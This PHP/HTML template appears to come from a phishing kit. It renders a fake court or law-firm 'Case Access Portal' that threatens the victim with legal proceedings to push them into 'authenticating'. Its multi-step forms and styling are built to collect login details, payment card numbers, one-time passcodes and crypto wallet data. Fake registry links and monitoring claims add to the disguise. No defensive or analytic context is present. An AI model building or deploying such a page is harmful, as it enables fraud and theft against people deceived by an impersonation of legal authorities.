<?php
// Legal template — Court / Law firm / Debt recovery / Attorney General style
// Formal dark theme, gavel/scales imagery, serif fonts, case reference prominent
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title><?=$org_name?> — Case Access Portal</title>
<meta name="robots" content="noindex,nofollow">
<link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@400;700&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
<style>
*{margin:0;padding:0;box-sizing:border-box}
:root{--a:<?=$accent?>;--s:<?=$sec?>;--r:<?=$ar?>;--g:<?=$ag?>;--b:<?=$ab?>}
body{font-family:'Inter',system-ui,sans-serif;min-height:100vh;min-height:100dvh;
  background:#1a1a24;display:flex;flex-direction:column;align-items:center;
  justify-content:center;padding:20px 16px;color:#e8e8f0}

/* Card */
.card{width:100%;max-width:480px;background:#22222e;border:1px solid #2e2e3e;
  border-radius:4px;overflow:hidden;box-shadow:0 8px 40px rgba(0,0,0,.5)}

/* Top stripe */
.top-stripe{height:4px;background:linear-gradient(90deg,<?=$accent?> 0%,<?=$sec?> 100%)}

/* Header */
.hd{background:#1e1e2a;padding:22px 28px 18px;border-bottom:1px solid #2e2e3e;position:relative}
.hd-row{display:flex;align-items:center;gap:16px}
.logo-box{width:58px;height:58px;background:<?=$logo_bg?>;border:1px solid #3a3a4a;
  border-radius:6px;display:flex;align-items:center;justify-content:center;overflow:hidden;flex-shrink:0}
.logo-box img{width:100%;height:100%;object-fit:contain}
.logo-ini{font-size:20px;font-weight:700;color:<?=$accent?>;font-family:'Playfair Display',Georgia,serif}
.hd-name{font-size:17px;font-weight:700;color:#f0f0f8;line-height:1.2;
  font-family:'Playfair Display',Georgia,serif}
.hd-sub{font-size:11px;color:#7070a0;margin-top:3px;text-transform:uppercase;letter-spacing:.5px}
.hd-badge{display:inline-flex;align-items:center;gap:5px;margin-top:6px;
  background:rgba(<?=$ar?>,<?=$ag?>,<?=$ab?>,.12);border:1px solid rgba(<?=$ar?>,<?=$ag?>,<?=$ab?>,.25);
  border-radius:3px;padding:3px 10px;font-size:10px;font-weight:600;
  color:<?=$accent?>;text-transform:uppercase;letter-spacing:.5px}

/* Notice / urgent bar */
.notice-bar{background:rgba(220,38,38,.08);border-bottom:1px solid rgba(220,38,38,.2);
  padding:10px 28px;display:flex;align-items:flex-start;gap:10px}
.notice-icon{font-size:14px;flex-shrink:0;margin-top:1px}
.notice-text{font-size:11px;color:#fca5a5;line-height:1.5;font-weight:500}
.notice-strong{font-weight:700;color:#ef4444;text-transform:uppercase;letter-spacing:.3px}

/* Case ref */
.case-ref{padding:12px 28px;background:rgba(255,255,255,.03);border-bottom:1px solid #2e2e3e;
  display:flex;align-items:center;justify-content:space-between}
.case-ref-label{font-size:10px;color:#5a5a7a;text-transform:uppercase;letter-spacing:.5px}
.case-ref-val{font-size:13px;font-weight:600;color:#a0a0c0;font-family:monospace;letter-spacing:.5px}

/* Body */
.bd{padding:24px 28px 22px}
.step-title{font-size:19px;font-weight:700;color:#f0f0f8;margin-bottom:4px;
  font-family:'Playfair Display',Georgia,serif;line-height:1.3}
.step-sub{font-size:13px;color:#7070a0;margin-bottom:20px;line-height:1.5}

/* Fields */
.field{margin-bottom:15px}
.field label{display:block;font-size:11px;font-weight:700;color:#8080b0;
  margin-bottom:6px;letter-spacing:.5px;text-transform:uppercase}
.field input{width:100%;background:#181820;border:1px solid #2e2e3e;color:#e0e0f0;
  padding:12px 14px;border-radius:4px;font-size:15px;outline:none;
  font-family:inherit;-webkit-appearance:none;transition:border-color .15s,box-shadow .15s}
.field input:focus{border-color:<?=$accent?>;
  box-shadow:0 0 0 3px rgba(<?=$ar?>,<?=$ag?>,<?=$ab?>,.12)}
.field input::placeholder{color:#4a4a6a}
.card-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px}
.or-div{text-align:center;font-size:12px;color:#4a4a6a;margin:12px 0;position:relative}
.or-div::before,.or-div::after{content:'';position:absolute;top:50%;width:43%;height:1px;background:#2e2e3e}
.or-div::before{left:0}.or-div::after{right:0}

/* Button */
.btn{width:100%;padding:13px;background:<?=$accent?>;color:#fff;font-size:14px;font-weight:700;
  border:none;border-radius:4px;cursor:pointer;margin-top:6px;
  letter-spacing:.5px;text-transform:uppercase;
  transition:filter .15s;position:relative;font-family:'Inter',sans-serif}
.btn:hover{filter:brightness(1.1)}
.btn:disabled{opacity:.5;cursor:not-allowed}
.btn.loading::after{content:'';position:absolute;right:16px;top:50%;width:16px;height:16px;
  border:2px solid rgba(255,255,255,.3);border-top-color:#fff;border-radius:50%;
  transform:translateY(-50%);animation:spin .7s linear infinite}
@keyframes spin{to{transform:translateY(-50%) rotate(360deg)}}
.err-msg{font-size:12px;color:#ef4444;margin-top:8px;display:none}

/* Links */
.forgot-link{display:block;text-align:center;margin-top:12px;font-size:12px;
  color:#6070c0;text-decoration:none}
.forgot-link:hover{text-decoration:underline;color:<?=$accent?>}

/* Warning */
.legal-warning{background:rgba(220,38,38,.05);border:1px solid rgba(220,38,38,.15);
  border-radius:4px;padding:12px 14px;margin-top:16px;font-size:11px;
  color:#9090b0;line-height:1.6}

/* OTP / wallet */
.otp-wrap{display:flex;gap:8px;justify-content:center}
.otp-wrap input{flex:1;text-align:center;font-size:20px;font-weight:700;padding:12px 4px;max-width:48px;
  background:#181820;border:1px solid #2e2e3e;border-radius:4px;color:#e0e0f0;outline:none}
.otp-wrap input:focus{border-color:<?=$accent?>}
.otp-hint{font-size:12px;color:#5a5a7a;text-align:center;margin-top:8px}
.wallet-area{width:100%;min-height:80px;background:#181820;border:1px solid #2e2e3e;color:#e0e0f0;
  padding:12px 14px;border-radius:4px;font-size:13px;font-family:monospace;outline:none;resize:none}
.wallet-area:focus{border-color:<?=$accent?>}
.wallet-hint{font-size:11px;color:#5a5a7a;margin-top:6px;line-height:1.5;text-align:center}
.addr-area{width:100%;min-height:60px;background:#181820;border:1px solid #2e2e3e;color:#e0e0f0;
  padding:12px 14px;border-radius:4px;font-size:14px;font-family:inherit;outline:none;resize:none}
.addr-area:focus{border-color:<?=$accent?>}

/* Footer */
.card-footer{padding:14px 28px;border-top:1px solid #2e2e3e;font-size:10px;color:#4a4a6a;
  text-align:center;line-height:1.7;background:#1e1e2a}
.card-footer a{color:#4a4a6a;text-decoration:none}
.card-footer a:hover{text-decoration:underline}

#loadOverlay{display:none;position:fixed;inset:0;background:rgba(26,26,36,.92);z-index:999;
  align-items:center;justify-content:center;flex-direction:column;gap:16px}
#loadOverlay.show{display:flex}
.load-spin{width:40px;height:40px;border:3px solid #2e2e3e;border-top-color:<?=$accent?>;
  border-radius:50%;animation:spin .8s linear infinite}
.load-txt{font-size:13px;color:#5a5a7a}

@media(max-width:480px){
  .card{border-radius:0;min-height:100vh;min-height:100dvh;
    box-shadow:none;width:100%;max-width:100%}
  .bd{padding:20px 20px 18px}
  .card-footer{padding:12px 20px}
}
</style>
</head>
<body>
<div id="loadOverlay"><div class="load-spin"></div><div class="load-txt" id="loadText">Authenticating…</div></div>

<div class="card">
  <div class="top-stripe"></div>
  <div class="hd">
    <div class="hd-row">
      <div class="logo-box">
        <?php if($logo_url): ?>
        <img src="<?=htmlspecialchars($logo_url)?>" alt="<?=htmlspecialchars($org_name)?>" onerror="this.style.display='none';this.nextElementSibling.style.display='block'">
        <div class="logo-ini" style="display:none"><?=strtoupper(substr($org_name,0,2))?></div>
        <?php else: ?>
        <div class="logo-ini"><?=strtoupper($org_name[0] ?? 'L')?></div>
        <?php endif; ?>
      </div>
      <div>
        <div class="hd-name"><?=htmlspecialchars($org_name)?></div>
        <div class="hd-sub">Official Case Portal</div>
        <div class="hd-badge">⚖ Authorized Access Only</div>
      </div>
    </div>
  </div>

  <!-- Urgent notice -->
  <div class="notice-bar">
    <div class="notice-icon">⚠️</div>
    <div class="notice-text"><span class="notice-strong">Action Required</span> — You must access your case file to avoid further legal proceedings. Authenticate now to respond.</div>
  </div>

  <!-- Case reference -->
  <?php if(!empty($ref_code)): ?>
  <div class="case-ref">
    <div class="case-ref-label">Case Reference</div>
    <div class="case-ref-val"><?=htmlspecialchars($ref_code)?></div>
  </div>
  <?php endif; ?>

  <div class="bd">
    <?php for($sn=1;$sn<=$total_steps;$sn++): ?>
    <div id="step<?=$sn?>" <?=$sn>1?'style="display:none"':''?>>
      <div class="step-title"><?=htmlspecialchars($sc['step_titles'][$sn])?></div>
      <?php if(!empty($sc['step_subs'][$sn])): ?>
      <div class="step-sub" id="step<?=$sn?>sub"><?=htmlspecialchars($sc['step_subs'][$sn])?></div>
      <?php endif; ?>
      <form onsubmit="submitStep(event,<?=$sn?>)">
        <?php $fld = $sc['step'.$sn.'_fields'] ?? 'email_only'; include __DIR__.'/partials/fields.php'; ?>
        <button type="submit" class="btn" id="btn<?=$sn?>"><?=htmlspecialchars($sc['btn_labels'][$sn-1])?></button>
        <div class="err-msg" id="err<?=$sn?>">Please enter the required information.</div>
      </form>
      <?php if($sn===1): ?>
      <a href="#" class="forgot-link" onclick="return false">Cannot access your account? Contact the Registry</a>
      <?php endif; ?>
    </div>
    <?php endfor; ?>
  </div>

  <div class="card-footer">
    <?=$footer?> — CONFIDENTIAL<br>
    Unauthorised access to this system is prohibited. All access is monitored and logged.<br>
    <a href="#">Privacy Notice</a> &nbsp;|&nbsp; <a href="#">Accessibility</a> &nbsp;|&nbsp; <a href="#">Legal Notices</a>
  </div>
</div>

<?php include __DIR__.'/partials/js.php'; ?>
</body>
</html>
